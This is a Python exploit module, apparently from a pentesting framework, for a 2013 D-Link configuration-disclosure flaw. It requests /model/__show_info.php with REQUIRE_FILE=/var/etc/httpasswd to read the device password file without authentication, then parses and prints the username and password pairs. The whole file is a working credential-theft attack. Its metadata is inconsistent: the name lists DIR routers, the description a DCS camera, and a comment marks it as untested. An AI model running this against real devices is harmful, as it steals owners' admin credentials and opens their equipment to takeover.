#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import re

import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'D-Link DIR 300, 320, 600, 615 Config disclosure',
        'description': 'D-Link DCS 930L configure information allow unauthenticated access',
        'reference': ['http://seclists.org/bugtraq/2013/Dec/11'],
    }

    prompt = 'dcs_config_show_info'

    def __init__(self):
        super().__init__()
        self.info = None

    def check(self, host, port, timeout):
        creds = self.get_creds(host, port, timeout)
        if creds:
            self.info = creds
            self.print_check_result(True, host)
            return True

        self.print_check_result(False, host)
        return False

    def run(self, host, port, timeout):
        # TODO NOT TESTING
        if self.info:
            utils.print_success(self.info)
        else:
            creds = self.get_creds(host, port, timeout)
            if creds:
                self.info = creds
                utils.print_success(creds)
            else:
                self.print_check_result(False, host)

    def get_creds(self, host, port, timeout):
        url = "http://{}:{}/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd".format(host, port)

        resp, err = self.http_get(self.s, url, timeout)
        if err:
            self.print_requests_err(host, port, err)
            self.print_check_result(False, host)
            return None

        creds = re.findall("\n\t\t\t(.+?):(.+?)\n\n\t\t\t", resp.text)

        if len(creds):
            return creds

        return None
